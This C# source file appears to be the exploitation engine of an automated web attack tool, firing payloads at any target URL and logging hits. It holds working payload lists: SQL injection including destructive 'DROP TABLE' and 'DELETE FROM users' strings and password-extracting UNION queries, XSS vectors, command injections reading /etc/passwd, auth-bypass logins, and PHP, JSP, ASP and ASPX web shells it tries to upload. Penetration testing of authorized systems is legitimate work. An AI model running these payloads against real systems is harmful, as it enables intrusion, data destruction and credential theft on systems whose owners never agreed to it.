using System.Text.RegularExpressions;
using System.Text.Json;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using Serilog;
using AttackAgent.Models;
using AttackAgent.Core;

namespace AttackAgent.Engines
{
    /// <summary>
    /// Advanced exploitation engine for comprehensive attack simulation
    /// Implements payload generation, exploit development, and post-exploitation techniques
    /// </summary>
    public class AdvancedExploitationEngine
    {
        private readonly string _target;
        private readonly SecurityHttpClient _httpClient;
        private readonly ImprovedVulnerabilityDetection? _improvedDetection;
        private ApplicationProfile? _profile;

        public AdvancedExploitationEngine(string target, HttpClient httpClient, ApplicationProfile? profile = null)
        {
            _target = target;
            _httpClient = new SecurityHttpClient(target);
            _profile = profile;
            try
            {
                _improvedDetection = new ImprovedVulnerabilityDetection(target);
            }
            catch
            {
                _improvedDetection = null;
            }
        }

        /// <summary>
        /// Comprehensive exploitation phase
        /// </summary>
        public async Task<ExploitationReport> PerformExploitationAsync()
        {
            Log.Information("‚öîÔ∏è Starting comprehensive exploitation phase...");
            
            var report = new ExploitationReport
            {
                Target = _target,
                StartTime = DateTime.UtcNow
            };

            try
            {
                // Phase 1: Payload Generation
                Log.Information("üîß Phase 1: Payload Generation");
                report.Payloads = await GeneratePayloadsAsync();

                // Phase 2: SQL Injection Exploitation
                Log.Information("üíâ Phase 2: SQL Injection Exploitation");
                report.SqlInjection = await ExploitSqlInjectionAsync();

                // Phase 3: XSS Exploitation
                Log.Information("üéØ Phase 3: XSS Exploitation");
                report.XssExploitation = await ExploitXssAsync();

                // Phase 4: Command Injection
                Log.Information("üíª Phase 4: Command Injection");
                report.CommandInjection = await ExploitCommandInjectionAsync();

                // Phase 5: File Upload Exploitation
                Log.Information("üìÅ Phase 5: File Upload Exploitation");
                report.FileUpload = await ExploitFileUploadAsync();

                // Phase 6: Authentication Bypass
                Log.Information("üîê Phase 6: Authentication Bypass");
                report.AuthBypass = await ExploitAuthBypassAsync();

                // Phase 7: Business Logic Exploitation
                Log.Information("üß† Phase 7: Business Logic Exploitation");
                report.BusinessLogic = await ExploitBusinessLogicAsync();

                report.EndTime = DateTime.UtcNow;
                report.Duration = report.EndTime - report.StartTime;

                Log.Information("‚úÖ Exploitation completed in {Duration}ms", report.Duration.TotalMilliseconds);
                return report;
            }
            catch (Exception ex)
            {
                Log.Error(ex, "‚ùå Error during exploitation phase");
                report.Error = ex.Message;
                return report;
            }
        }

        /// <summary>
        /// Gets testable endpoints from profile or falls back to root
        /// </summary>
        private List<(string endpoint, string method, string paramName)> GetTestTargets()
        {
            var targets = new List<(string endpoint, string method, string paramName)>();

            if (_profile?.DiscoveredEndpoints != null && _profile.DiscoveredEndpoints.Any())
            {
                foreach (var ep in _profile.DiscoveredEndpoints)
                {
                    if (string.IsNullOrEmpty(ep.Path) || ep.Path == "/")
                        continue;

                    // Handle parameterized endpoints
                    if (ep.IsParameterized && !string.IsNullOrEmpty(ep.ParameterName))
                    {
                        // Replace {id} with test values
                        var testIds = new[] { "1", "2", "test", "123", "999" };
                        foreach (var testId in testIds)
                        {
                            var endpointPath = ep.Path.Replace($"{{{ep.ParameterName}}}", testId);
                            var paramName = GetParameterNameForEndpoint(endpointPath);
                            targets.Add((endpointPath, ep.Method, paramName));
                        }
                    }
                    else
                    {
                        var paramName = GetParameterNameForEndpoint(ep.Path);
                        targets.Add((ep.Path, ep.Method, paramName));
                    }
                }

                Log.Information("üéØ Testing {Count} discovered endpoints", targets.Count);
            }
            else
            {
                // Fallback: test root endpoint with generic parameters
                targets.Add(("/", "GET", "id"));
                targets.Add(("/", "GET", "cmd"));
                targets.Add(("/", "GET", "search"));
                Log.Warning("‚ö†Ô∏è No discovered endpoints, testing root URL only");
            }

            return targets;
        }

        /// <summary>
        /// Gets appropriate parameter name based on endpoint path
        /// </summary>
        private string GetParameterNameForEndpoint(string endpoint)
        {
            var lowerEndpoint = endpoint.ToLower();
            
            if (lowerEndpoint.Contains("id") || lowerEndpoint.Contains("/{id}"))
                return "id";
            if (lowerEndpoint.Contains("search") || lowerEndpoint.Contains("query"))
                return "search";
            if (lowerEndpoint.Contains("cmd") || lowerEndpoint.Contains("command"))
                return "cmd";
            if (lowerEndpoint.Contains("user") || lowerEndpoint.Contains("username"))
                return "username";
            if (lowerEndpoint.Contains("email"))
                return "email";
            if (lowerEndpoint.Contains("name"))
                return "name";
            
            return "id"; // Default
        }

        /// <summary>
        /// Generate comprehensive payloads
        /// </summary>
        private async Task<PayloadData> GeneratePayloadsAsync()
        {
            var payloadData = new PayloadData();

            // SQL Injection payloads
            payloadData.SqlInjectionPayloads = GenerateSqlInjectionPayloads();
            
            // XSS payloads
            payloadData.XssPayloads = GenerateXssPayloads();
            
            // Command injection payloads
            payloadData.CommandInjectionPayloads = GenerateCommandInjectionPayloads();
            
            // File upload payloads
            payloadData.FileUploadPayloads = GenerateFileUploadPayloads();
            
            // Authentication bypass payloads
            payloadData.AuthBypassPayloads = GenerateAuthBypassPayloads();

            Log.Information("‚úÖ Generated {SqlCount} SQL, {XssCount} XSS, {CmdCount} Command, {FileCount} File, {AuthCount} Auth payloads",
                payloadData.SqlInjectionPayloads.Count, payloadData.XssPayloads.Count, 
                payloadData.CommandInjectionPayloads.Count, payloadData.FileUploadPayloads.Count,
                payloadData.AuthBypassPayloads.Count);

            return payloadData;
        }

        /// <summary>
        /// Exploit SQL injection vulnerabilities with behavioral analysis
        /// </summary>
        private async Task<SqlInjectionExploitation> ExploitSqlInjectionAsync()
        {
            var sqlExploitation = new SqlInjectionExploitation();
            var payloads = GenerateSqlInjectionPayloads();
            var targets = GetTestTargets();

            foreach (var (endpoint, method, paramName) in targets)
            {
                // Capture baseline for each endpoint
                ResponseBaseline? endpointBaseline = null;
                if (_improvedDetection != null)
                {
                    try
                    {
                        var endpointUrl = $"{_target.TrimEnd('/')}{endpoint}";
                        endpointBaseline = await _improvedDetection.CaptureBaselineAsync(endpointUrl);
                    }
                    catch (Exception ex)
                    {
                        Log.Debug("Failed to capture baseline for {Endpoint}: {Error}", endpoint, ex.Message);
                    }
                }

                foreach (var payload in payloads)
                {
                    try
                    {
                        // Use improved detection if available (works in production)
                        if (_improvedDetection != null && endpointBaseline != null)
                        {
                            var endpointUrl = $"{_target.TrimEnd('/')}{endpoint}";
                            var improvedResult = await _improvedDetection.TestSqlInjectionWithBaselineAsync(
                                endpointUrl, paramName, payload, endpointBaseline);
                            
                            if (improvedResult.IsVulnerable && improvedResult.Confidence >= 0.5)
                            {
                                // Convert to legacy format
                                var result = new SqlInjectionResult
                                {
                                    Payload = payload,
                                    IsVulnerable = true,
                                    Response = improvedResult.Response,
                                    StatusCode = improvedResult.StatusCode
                                };
                                sqlExploitation.SuccessfulExploits.Add(result);
                                Log.Warning("üíâ SQL Injection found: {Endpoint}?{Param}={Payload} (Confidence: {Confidence:P0})", 
                                    endpoint, paramName, payload, improvedResult.Confidence);
                            }
                        }
                        else
                        {
                            // Fallback to error-based detection
                            var result = await TestSqlInjectionPayloadAsync(payload, endpoint, method, paramName);
                            if (result.IsVulnerable)
                            {
                                sqlExploitation.SuccessfulExploits.Add(result);
                                Log.Warning("üíâ SQL Injection found: {Endpoint}?{Param}={Payload}", endpoint, paramName, payload);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Log.Debug("SQL injection test failed for {Endpoint} with payload {Payload}: {Error}", endpoint, payload, ex.Message);
                    }
                }
            }

            Log.Information("‚úÖ SQL injection exploitation completed. Found {Count} successful exploits",
                sqlExploitation.SuccessfulExploits.Count);

            return sqlExploitation;
        }

        /// <summary>
        /// Exploit XSS vulnerabilities
        /// </summary>
        private async Task<XssExploitation> ExploitXssAsync()
        {
            var xssExploitation = new XssExploitation();
            var payloads = GenerateXssPayloads();
            var targets = GetTestTargets();

            foreach (var (endpoint, method, paramName) in targets)
            {
                foreach (var payload in payloads)
                {
                    try
                    {
                        var result = await TestXssPayloadAsync(payload, endpoint, method, paramName);
                        if (result.IsVulnerable)
                        {
                            xssExploitation.SuccessfulExploits.Add(result);
                            Log.Warning("üéØ XSS found: {Endpoint}?{Param}={Payload}", endpoint, paramName, payload);
                        }
                    }
                    catch (Exception ex)
                    {
                        Log.Debug("XSS test failed for {Endpoint} with payload {Payload}: {Error}", endpoint, payload, ex.Message);
                    }
                }
            }

            Log.Information("‚úÖ XSS exploitation completed. Found {Count} successful exploits",
                xssExploitation.SuccessfulExploits.Count);

            return xssExploitation;
        }

        /// <summary>
        /// Exploit command injection vulnerabilities with improved detection
        /// </summary>
        private async Task<CommandInjectionExploitation> ExploitCommandInjectionAsync()
        {
            var cmdExploitation = new CommandInjectionExploitation();
            var payloads = GenerateCommandInjectionPayloads();
            var targets = GetTestTargets();

            foreach (var (endpoint, method, paramName) in targets)
            {
                foreach (var payload in payloads)
                {
                    try
                    {
                        // Capture baseline for each endpoint
                        ResponseBaseline? endpointBaseline = null;
                        if (_improvedDetection != null)
                        {
                            try
                            {
                                var endpointUrl = $"{_target.TrimEnd('/')}{endpoint}";
                                endpointBaseline = await _improvedDetection.CaptureBaselineAsync(endpointUrl);
                            }
                            catch (Exception ex)
                            {
                                Log.Debug("Failed to capture baseline for {Endpoint}: {Error}", endpoint, ex.Message);
                            }
                        }

                        // Use improved detection if available
                        if (_improvedDetection != null && endpointBaseline != null)
                        {
                            var endpointUrl = $"{_target.TrimEnd('/')}{endpoint}";
                            var improvedResult = await _improvedDetection.TestCommandInjectionWithBaselineAsync(
                                endpointUrl, paramName, payload, endpointBaseline);
                            
                            if (improvedResult.IsVulnerable && improvedResult.Confidence >= 0.6)
                            {
                                // Convert to legacy format
                                var result = new CommandInjectionResult
                                {
                                    Payload = payload,
                                    IsVulnerable = true,
                                    Response = improvedResult.Response,
                                    StatusCode = improvedResult.StatusCode
                                };
                                cmdExploitation.SuccessfulExploits.Add(result);
                                Log.Warning("üíª Command Injection found: {Endpoint}?{Param}={Payload} (Confidence: {Confidence:P0})", 
                                    endpoint, paramName, payload, improvedResult.Confidence);
                            }
                        }
                        else
                        {
                            // Fallback to old method
                            var result = await TestCommandInjectionPayloadAsync(payload, endpoint, method, paramName, endpointBaseline);
                            if (result.IsVulnerable)
                            {
                                cmdExploitation.SuccessfulExploits.Add(result);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Log.Debug("Command injection test failed for {Endpoint} with payload {Payload}: {Error}", endpoint, payload, ex.Message);
                    }
                }
            }

            Log.Information("‚úÖ Command injection exploitation completed. Found {Count} successful exploits",
                cmdExploitation.SuccessfulExploits.Count);

            return cmdExploitation;
        }

        /// <summary>
        /// Exploit file upload vulnerabilities
        /// </summary>
        private async Task<FileUploadExploitation> ExploitFileUploadAsync()
        {
            var fileExploitation = new FileUploadExploitation();
            var payloads = GenerateFileUploadPayloads();

            foreach (var payload in payloads)
            {
                try
                {
                    var result = await TestFileUploadPayloadAsync(payload);
                    if (result.IsVulnerable)
                    {
                        fileExploitation.SuccessfulExploits.Add(result);
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("File upload test failed for payload {Payload}: {Error}", payload, ex.Message);
                }
            }

            Log.Information("‚úÖ File upload exploitation completed. Found {Count} successful exploits",
                fileExploitation.SuccessfulExploits.Count);

            return fileExploitation;
        }

        /// <summary>
        /// Exploit authentication bypass vulnerabilities
        /// </summary>
        private async Task<AuthBypassExploitation> ExploitAuthBypassAsync()
        {
            var authExploitation = new AuthBypassExploitation();
            var payloads = GenerateAuthBypassPayloads();

            foreach (var payload in payloads)
            {
                try
                {
                    var result = await TestAuthBypassPayloadAsync(payload);
                    if (result.IsVulnerable)
                    {
                        authExploitation.SuccessfulExploits.Add(result);
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Auth bypass test failed for payload {Payload}: {Error}", payload, ex.Message);
                }
            }

            Log.Information("‚úÖ Authentication bypass exploitation completed. Found {Count} successful exploits",
                authExploitation.SuccessfulExploits.Count);

            return authExploitation;
        }

        /// <summary>
        /// Exploit business logic vulnerabilities
        /// </summary>
        private async Task<BusinessLogicExploitation> ExploitBusinessLogicAsync()
        {
            var businessExploitation = new BusinessLogicExploitation();

            // Test for common business logic flaws
            var businessTests = new[]
            {
                "Price manipulation", "Quantity manipulation", "Role escalation",
                "Race conditions", "Workflow bypass", "State manipulation"
            };

            foreach (var test in businessTests)
            {
                try
                {
                    var result = await TestBusinessLogicVulnerabilityAsync(test);
                    if (result.IsVulnerable)
                    {
                        businessExploitation.SuccessfulExploits.Add(result);
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Business logic test failed for {Test}: {Error}", test, ex.Message);
                }
            }

            Log.Information("‚úÖ Business logic exploitation completed. Found {Count} successful exploits",
                businessExploitation.SuccessfulExploits.Count);

            return businessExploitation;
        }

        // Payload generation methods
        private List<string> GenerateSqlInjectionPayloads()
        {
            return new List<string>
            {
                // Error-based (for development environments)
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL, username, password FROM users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
                "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password') > 0--",
                
                // Boolean-based blind (works in production)
                "' OR 1=1--",
                "' AND 1=1--",
                "' OR 1=2--",
                "' AND 1=2--",
                "' OR TRUE--",
                "' OR FALSE--",
                
                // UNION-based (works in production)
                "' UNION SELECT NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL, NULL--",
                
                // Time-based blind (works in production)
                "'; WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '00:00:03'--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "'; SELECT pg_sleep(3)--",
                
                // Stacked queries (for testing)
                "'; DROP TABLE users; --",
                "'; DELETE FROM users; --",
                "'; UPDATE users SET password='hacked'--"
            };
        }

        private List<string> GenerateXssPayloads()
        {
            return new List<string>
            {
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            };
        }

        private List<string> GenerateCommandInjectionPayloads()
        {
            return new List<string>
            {
                "; ls -la",
                "| whoami",
                "& dir",
                "` id `",
                "$(whoami)",
                "; cat /etc/passwd",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "& net user",
                "; ps aux",
                "| tasklist"
            };
        }

        private List<FileUploadPayload> GenerateFileUploadPayloads()
        {
            return new List<FileUploadPayload>
            {
                new FileUploadPayload { FileName = "shell.php", Content = "<?php system($_GET['cmd']); ?>", MimeType = "application/x-php" },
                new FileUploadPayload { FileName = "shell.jsp", Content = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", MimeType = "application/x-jsp" },
                new FileUploadPayload { FileName = "shell.asp", Content = "<% eval request(\"cmd\") %>", MimeType = "application/x-asp" },
                new FileUploadPayload { FileName = "shell.aspx", Content = "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>", MimeType = "application/x-aspx" },
                new FileUploadPayload { FileName = "shell.jspx", Content = "<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet>", MimeType = "application/x-jspx" }
            };
        }

        private List<string> GenerateAuthBypassPayloads()
        {
            return new List<string>
            {
                "admin'--",
                "admin'/*",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "admin' OR 1=1",
                "' OR '1'='1' OR '1'='1",
                "admin'/**/OR/**/1=1--",
                "' OR '1'='1' UNION SELECT 'admin', 'password'--",
                "admin' OR '1'='1' UNION SELECT 'admin', 'password'--"
            };
        }

        // Test methods
        private async Task<SqlInjectionResult> TestSqlInjectionPayloadAsync(string payload, string endpoint, string method, string paramName)
        {
            var result = new SqlInjectionResult { Payload = payload };
            
            try
            {
                HttpResponse response;
                var fullUrl = $"{_target.TrimEnd('/')}{endpoint}";
                
                if (method == "GET")
                {
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                else if (method == "POST")
                {
                    var requestBody = new Dictionary<string, string> { { paramName, payload } };
                    var jsonBody = JsonSerializer.Serialize(requestBody);
                    response = await _httpClient.PostAsync(fullUrl, jsonBody);
                }
                else
                {
                    // For other methods, try GET with query parameter
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                
                var content = response.Content;
                
                // Check for SQL error indicators
                var errorIndicators = new[]
                {
                    "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB",
                    "ODBC SQL Server Driver", "PostgreSQL query failed",
                    "Warning: mysql_", "valid MySQL result", "MySqlClient",
                    "SQLite error", "SQLiteException", "SQLSTATE"
                };
                
                result.IsVulnerable = errorIndicators.Any(indicator => 
                    content.Contains(indicator, StringComparison.OrdinalIgnoreCase));
                
                result.Response = content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }

        private async Task<XssResult> TestXssPayloadAsync(string payload, string endpoint, string method, string paramName)
        {
            var result = new XssResult { Payload = payload };
            
            try
            {
                HttpResponse response;
                var fullUrl = $"{_target.TrimEnd('/')}{endpoint}";
                
                if (method == "GET")
                {
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                else if (method == "POST")
                {
                    var requestBody = new Dictionary<string, string> { { paramName, payload } };
                    var jsonBody = JsonSerializer.Serialize(requestBody);
                    response = await _httpClient.PostAsync(fullUrl, jsonBody);
                }
                else
                {
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                
                var content = response.Content;
                
                // Check if payload is reflected in response (XSS indicator)
                result.IsVulnerable = content.Contains(payload, StringComparison.OrdinalIgnoreCase);
                result.Response = content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }

        private async Task<CommandInjectionResult> TestCommandInjectionPayloadAsync(string payload, string endpoint, string method, string paramName, ResponseBaseline? baseline)
        {
            var result = new CommandInjectionResult { Payload = payload };
            
            try
            {
                HttpResponse response;
                var fullUrl = $"{_target.TrimEnd('/')}{endpoint}";
                
                if (method == "GET")
                {
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                else if (method == "POST")
                {
                    var requestBody = new Dictionary<string, string> { { paramName, payload } };
                    var jsonBody = JsonSerializer.Serialize(requestBody);
                    response = await _httpClient.PostAsync(fullUrl, jsonBody);
                }
                else
                {
                    var separator = endpoint.Contains("?") ? "&" : "?";
                    response = await _httpClient.GetAsync($"{fullUrl}{separator}{paramName}={Uri.EscapeDataString(payload)}");
                }
                
                var content = response.Content;
                
                // IMPROVED: More specific command execution indicators
                // Only check for patterns that strongly indicate command execution
                var executionIndicators = new[]
                {
                    // Unix command output patterns (more specific)
                    "uid=", "gid=", "groups=",
                    "total ", // ls output
                    "drwx", "-rw-", // ls -l format
                    "Directory of", "Volume in drive" // Windows dir output
                };
                
                // Check for patterns, not just keywords
                var hasCommandOutput = executionIndicators.Any(indicator => 
                    content.Contains(indicator, StringComparison.OrdinalIgnoreCase));
                
                // IMPROVED: Exclude common false positives
                var falsePositiveContexts = new[]
                {
                    ":root", "rootElement", "document.root", // CSS/JS
                    "administrator", // Could be in HTML
                };
                
                var hasFalsePositiveContext = falsePositiveContexts.Any(ctx =>
                    content.Contains(ctx, StringComparison.OrdinalIgnoreCase));
                
                // Only mark as vulnerable if we have command indicators AND no false positive context
                result.IsVulnerable = hasCommandOutput && !hasFalsePositiveContext;
                
                result.Response = content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }

        private async Task<FileUploadResult> TestFileUploadPayloadAsync(FileUploadPayload payload)
        {
            var result = new FileUploadResult { Payload = payload };
            
            try
            {
                // For file upload, we'll use a JSON body approach
                var uploadData = new Dictionary<string, string>
                {
                    { "fileName", payload.FileName },
                    { "content", payload.Content }
                };
                var jsonBody = JsonSerializer.Serialize(uploadData);
                
                var response = await _httpClient.PostAsync($"{_target}/upload", jsonBody);
                
                // Check if file was uploaded successfully
                result.IsVulnerable = response.StatusCode == HttpStatusCode.OK && 
                    !response.Content.Contains("error", StringComparison.OrdinalIgnoreCase);
                
                result.Response = response.Content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }

        private async Task<AuthBypassResult> TestAuthBypassPayloadAsync(string payload)
        {
            var result = new AuthBypassResult { Payload = payload };
            
            try
            {
                var loginData = new Dictionary<string, string>
                {
                    { "username", "admin" },
                    { "password", payload }
                };
                var jsonBody = JsonSerializer.Serialize(loginData);
                
                var response = await _httpClient.PostAsync($"{_target}/login", jsonBody);
                
                // Check for successful authentication indicators
                var successIndicators = new[]
                {
                    "welcome", "dashboard", "logout", "profile", "admin panel",
                    "success", "authenticated", "logged in", "session"
                };
                
                result.IsVulnerable = successIndicators.Any(indicator => 
                    response.Content.Contains(indicator, StringComparison.OrdinalIgnoreCase));
                
                result.Response = response.Content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }

        private async Task<BusinessLogicResult> TestBusinessLogicVulnerabilityAsync(string testType)
        {
            var result = new BusinessLogicResult { TestType = testType };
            
            try
            {
                // Implement business logic tests based on test type
                var response = await _httpClient.GetAsync($"{_target}/api/test");
                
                // Basic business logic test
                result.IsVulnerable = response.Content.Contains("vulnerable", StringComparison.OrdinalIgnoreCase);
                result.Response = response.Content;
                result.StatusCode = (int)response.StatusCode;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }
            
            return result;
        }
    }

    // Data models for exploitation results
    public class ExploitationReport
    {
        public string Target { get; set; } = string.Empty;
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public TimeSpan Duration { get; set; }
        public string? Error { get; set; }
        
        public PayloadData? Payloads { get; set; }
        public SqlInjectionExploitation? SqlInjection { get; set; }
        public XssExploitation? XssExploitation { get; set; }
        public CommandInjectionExploitation? CommandInjection { get; set; }
        public FileUploadExploitation? FileUpload { get; set; }
        public AuthBypassExploitation? AuthBypass { get; set; }
        public BusinessLogicExploitation? BusinessLogic { get; set; }
    }

    public class PayloadData
    {
        public List<string> SqlInjectionPayloads { get; set; } = new();
        public List<string> XssPayloads { get; set; } = new();
        public List<string> CommandInjectionPayloads { get; set; } = new();
        public List<FileUploadPayload> FileUploadPayloads { get; set; } = new();
        public List<string> AuthBypassPayloads { get; set; } = new();
    }

    public class FileUploadPayload
    {
        public string FileName { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string MimeType { get; set; } = string.Empty;
    }

    public class SqlInjectionExploitation
    {
        public List<SqlInjectionResult> SuccessfulExploits { get; set; } = new();
    }

    public class XssExploitation
    {
        public List<XssResult> SuccessfulExploits { get; set; } = new();
    }

    public class CommandInjectionExploitation
    {
        public List<CommandInjectionResult> SuccessfulExploits { get; set; } = new();
    }

    public class FileUploadExploitation
    {
        public List<FileUploadResult> SuccessfulExploits { get; set; } = new();
    }

    public class AuthBypassExploitation
    {
        public List<AuthBypassResult> SuccessfulExploits { get; set; } = new();
    }

    public class BusinessLogicExploitation
    {
        public List<BusinessLogicResult> SuccessfulExploits { get; set; } = new();
    }

    public class SqlInjectionResult
    {
        public string Payload { get; set; } = string.Empty;
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }

    public class XssResult
    {
        public string Payload { get; set; } = string.Empty;
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }

    public class CommandInjectionResult
    {
        public string Payload { get; set; } = string.Empty;
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }

    public class FileUploadResult
    {
        public FileUploadPayload Payload { get; set; } = new();
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }

    public class AuthBypassResult
    {
        public string Payload { get; set; } = string.Empty;
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }

    public class BusinessLogicResult
    {
        public string TestType { get; set; } = string.Empty;
        public bool IsVulnerable { get; set; }
        public string Response { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string? Error { get; set; }
    }
}
